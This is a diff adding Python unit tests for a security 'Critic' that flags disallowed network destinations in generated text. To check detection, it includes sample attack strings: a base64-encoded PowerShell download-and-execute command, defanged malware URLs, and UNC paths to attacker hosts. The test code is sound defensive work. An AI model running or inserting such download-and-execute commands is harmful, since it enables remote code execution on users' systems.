@@ -8,6 +8,8 @@ retraction text that a routine regeneration could silently delete.
 from __future__ import annotations
 
 import ast
+import base64
+import ipaddress
 
 import re
 import tempfile
@@ -17,6 +19,7 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parents[1]
 
 from tools.swarm.adapter import SwarmAdapter  # noqa: E402
+from tools.swarm.critic import PERMITTED_ADDRESS_RANGES  # noqa: E402
 from tools.swarm.cable_writer import CableWriter, _existing_index_rows, _rebuild_index  # noqa: E402
 from tools.swarm.export_layer import MitreLayerExporter  # noqa: E402
 from tools.swarm.models import BoundaryFinding, Variant  # noqa: E402
@@ -147,6 +150,11 @@ class DestinationContainmentTests(unittest.TestCase):
                 offenders.append(f"{path.name}: host {host}")
             for ip in {m.group(0) for m in re.finditer(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text)}:
                 if ip in _ALLOWED_IPS or ip.startswith(_ALLOWED_IP_PREFIXES):
+                    continue
+                # The Critic's declared policy table is the authority: any literal inside a
+                # permitted (loopback/link-local/private/documentation) range is in scope for
+                # local fixtures, and anything outside it is an offender.
+                if any(ipaddress.ip_address(ip) in network for network in PERMITTED_ADDRESS_RANGES):
                     continue
                 offenders.append(f"{path.name}: ip {ip}")
         self.assertEqual(
@@ -337,6 +345,102 @@ class ClaimVocabularyTests(unittest.TestCase):
         if reads_feedback:
             self.fail("craftsmen now read `feedback`; the nominal-feedback limitation must be removed")
         self.assertIn("Craft-level feedback is not consumed", note)
+
+
+class CriticDestinationPolicyTests(unittest.TestCase):
+    """The Critic's accepted set must match the policy it declares, not drift from it."""
+
+    def setUp(self):
+        from tools.swarm.critic import SwarmCritic
+        self.critic = SwarmCritic()
+
+    def _issues(self, text):
+        return self.critic._check_safety_boundaries(text)
+
+    def test_declared_policy_table_matches_enforcement(self):
+        permitted = [
+            "http://127.0.0.1/x", "http://169.254.169.254/latest/meta-data/",
+            "http://10.0.0.5/x", "http://192.168.1.10/x", "http://192.0.2.10/x",
+            "http://203.0.113.10/x", "http://198.51.100.7/x",
+            "http://payload.invalid/x", "http://host.example/x", "http://name.test/x",
+        ]
+        for text in permitted:
+            self.assertEqual([], self._issues(text), f"should be permitted: {text}")
+
+        rejected = [
+            "http://8.8.8.8/x", "http://173.16.0.1/x", "http://1.1.1.1/x",
+            "http://evil.com/x", "http://crypto-airdrop.top/x",
+        ]
+        for text in rejected:
+            self.assertTrue(self._issues(text), f"should be rejected: {text}")
+
+    def test_defanged_unc_and_encoded_destinations_are_checked(self):
+        self.assertTrue(self._issues("hxxp://crypto-airdrop[.]top/payload"))
+        self.assertTrue(self._issues("h**p://free-movies.xyz/a.exe"))
+        self.assertTrue(self._issues(r"\\attacker-host.com\share\payload.exe"))
+        encoded = base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/x.ps1')").decode()
+        self.assertTrue(self._issues(f"powershell -enc {encoded}"), "base64-hidden destination")
+        # Reserved hosts stay permitted in every form.
+        self.assertEqual([], self._issues("hxxp://payload[.]invalid/x"))
+        safe_encoded = base64.b64encode(b"http://payload.invalid/x.ps1").decode()
+        self.assertEqual([], self._issues(f"powershell -enc {safe_encoded}"))
+
+    def test_ip_finding_wording_matches_the_check(self):
+        """A documentation range is non-reserved, not routable; the message must not say routable."""
+        for text in ("192.0.2.99", "203.0.113.99"):
+            self.assertEqual([], self._issues(text))
+
+
+class LedgerDurabilityTests(unittest.TestCase):
+    """An append failure must not silently desynchronise counters from the ledger."""
+
+    def test_append_failure_marks_the_run_degraded(self):
+        from tools.swarm.endurance_runner import EnduranceRunner
+
+        class _FailingWriter:
+            def append(self, record):
+                raise OSError("disk full")
+
+        class _Stub:
+            run_id = "run-test"
+            record_writer = _FailingWriter()
+
+            def _ensure_writer(self):
+                return self.record_writer
+
+        stub = _Stub()
+        EnduranceRunner._emit(stub, suite="test", kind="probe")
+        self.assertTrue(getattr(stub, "ledger_degraded", False), "run must be marked degraded")
+        self.assertIn("OSError", getattr(stub, "ledger_error", ""))
+
+
+class FileSuffixDenylistTests(unittest.TestCase):
+    """The UNC file-suffix denylist must never contain a string that is also a real TLD.
+
+    A `.com` entry silently skipped every host under the most common TLD in existence, so the
+    denylist is checked against the TLD overlap that caused it.
+    """
+
+    # Suffixes that are both plausible file extensions and real top-level domains.
+    TLD_LOOKALIKES = (
+        ".com", ".sh", ".py", ".ms", ".io", ".co", ".nu", ".app", ".dev", ".so", ".pl",
+        ".rs", ".ai", ".cc", ".tv", ".me", ".it", ".in", ".to", ".gg", ".fm", ".pm", ".tf",
+    )
+
+    def test_denylist_contains_no_real_tld(self):
+        from tools.swarm.critic import FILE_LIKE_SUFFIXES
+        overlap = sorted(set(FILE_LIKE_SUFFIXES) & set(self.TLD_LOOKALIKES))
+        self.assertEqual([], overlap, f"UNC denylist shadows real TLDs: {overlap}")
+
+    def test_com_host_in_unc_form_is_still_a_destination(self):
+        from tools.swarm.critic import SwarmCritic
+        critic = SwarmCritic()
+        issues = critic._check_safety_boundaries(r"\\cdn.attacker-cdn.com\share\payload.bin")
+        self.assertTrue(issues, "a .com UNC host must still be checked")
+        # ...and a local Windows path that merely contains dots is not a destination.
+        self.assertEqual([], critic._check_safety_boundaries(
+            "ParentImage C:\\Program Files\\nodejs\\npx.cmd"
+        ))
 
 
 if __name__ == "__main__":  # pragma: no cover
